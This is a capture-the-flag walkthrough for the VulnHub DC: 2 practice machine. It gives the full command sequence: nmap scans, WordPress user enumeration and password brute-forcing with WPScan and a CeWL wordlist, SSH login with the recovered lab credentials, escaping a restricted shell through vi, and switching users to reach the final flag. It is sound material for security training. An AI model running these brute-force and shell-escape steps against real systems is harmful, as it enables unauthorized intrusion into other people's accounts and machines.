# DC: 2

- **Machine:** DC: 2
- **Download:** https://www.vulnhub.com/entry/dc-2,311/

![](819-1.png)

---

## Setup

- Extract the downloaded archive.
- Import the `.ova` file into VirtualBox.
- Click **Finish**.
- Start the virtual machine.

---

# Network Scanning

## Find the Target IP Address

```bash
nmap -sn 192.168.2.0/24
```

![](819-2.png)

---

## Full Port Scan

Run a comprehensive Nmap scan to enumerate all open ports, services, operating system details, and default NSE scripts.

```bash
nmap -v -Pn -sT -sV -sC -A -O -p- 192.168.2.248
```

![](819-3.png)

---

## Optional Port Scan

```bash
nmap -v -p- 192.168.2.248
```

```bash
nmap -sC -sV -A 192.168.2.248
```

---

## HTTP Enumeration

This command performs an aggressive scan and uses the `http-enum` NSE script to identify interesting web directories.

```bash
nmap -v -p 80 -sT -sV -A --script=http-enum.nse 192.168.2.248
```

![](819-4.png)

---

# Web Enumeration

## Configure Local Hostname

Add the target hostname to the hosts file.

```bash
nano /etc/hosts
```

![](819-5.png)

---

## Browse the Website

Visit the following URLs:

- http://dc-2/
- http://dc-2/wp-login.php

---

## Enumerate WordPress Users

Use WPScan to enumerate valid usernames.

```bash
wpscan --url http://dc-2 --enumerate u
```

![](819-6.png)

---

## Directory Enumeration

Perform directory brute-forcing.

```bash
gobuster dir -u http://dc-2/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html
```

![](819-7.png)

---

## Inspect the Website

Visit the homepage.

![](819-8.png)

Also visit the flag page:

- http://dc-2/index.php/flag/

![](819-9.png)

---

## Generate a Custom Wordlist

Use CeWL to build a password wordlist from the website content.

```bash
cewl http://dc-2/ > passwords.txt
```

Create a username file.

```bash
nano users.txt
```

![](819-10.png)

---

## Password Attack (Lab)

> **Lab note:** The following password attack is performed only against the authorized VulnHub practice machine.

Run WPScan using the discovered usernames and generated password list.

```bash
wpscan --url http://dc-2/ -U users.txt -P passwords.txt
```

![](819-11.png)

### Valid Credentials

```text
jerry : adipiscing
tom   : parturient
```

---

## WordPress Login

Login to:

- http://dc-2/wp-login.php

![](819-12.png)

![](819-13.png)

Successful authentication confirms the recovered credentials.

---

# SSH Access

The SSH service is available on **port 7744**.

## Login as Tom

```bash
ssh tom@192.168.2.248 -p 7744
```

```text
Username : tom
Password : parturient
```

![](819-14.png)

---

## Identify the Current Shell

```bash
echo $SHELL
```

![](819-15.png)

---

## Read the Hint

Display the contents of `flag3.txt`.

```bash
less flag3.txt
```

The file contains the following hint:

```text
Poor old Tom is always running after Jerry. Perhaps he should su for all the stress he causes.
```

![](819-16.png)

Press **q** to exit the file.

---

# Escape the Restricted Shell

The current shell is restricted (`rbash`). Escape it using **Vi**.

Start Vi.

```bash
vi
```

If you see `-- INSERT --`, press:

```text
Esc
```

Configure Bash as the default shell.

```bash
:set shell=/bin/bash
```

Spawn a Bash shell.

```bash
:shell
```

---

## Restore the Environment

Update the `PATH` variable.

```bash
export PATH=/bin:/usr/bin:$PATH
```

Set the shell environment variable.

```bash
export SHELL=/bin/bash
```

Verify the active shell.

```bash
echo $SHELL
```

![](819-17.png)

---

# Switch to Jerry

Use the credentials recovered earlier.

```bash
su jerry
```

```text
Username : jerry
Password : adipiscing
```

![](819-18.png)

![](819-19.png)

---

## Read the Final Flag

Navigate to Jerry's home directory.

```bash
cd /home/jerry
```

List the available files.

```bash
ls
```

Read the final flag.

```bash
cat flag4.txt
```

![](819-20.png)

---

# Impact

- WordPress usernames were publicly enumerable.
- Passwords were recovered using a custom CeWL-generated wordlist.
- Weak credentials allowed WordPress and SSH access.
- A restricted shell was successfully escaped.
- User privilege escalation was achieved by switching to another local account.

---

# Key Learning

- Always configure local hostnames when virtual hosts are used.
- WPScan is useful for WordPress user enumeration.
- CeWL can generate effective custom wordlists from website content.
- Restricted shells (`rbash`) may often be escaped using common editors.
- Credentials discovered in one service should always be tested against others.

---

# Summary

The assessment began by identifying a WordPress installation that required a local hostname entry. User enumeration with WPScan and password generation with CeWL resulted in valid WordPress credentials. These credentials also provided SSH access to the target on a non-standard port. After escaping the restricted shell using **Vi**, the recovered credentials were reused to switch to another local user, completing the privilege escalation process and obtaining the final flag.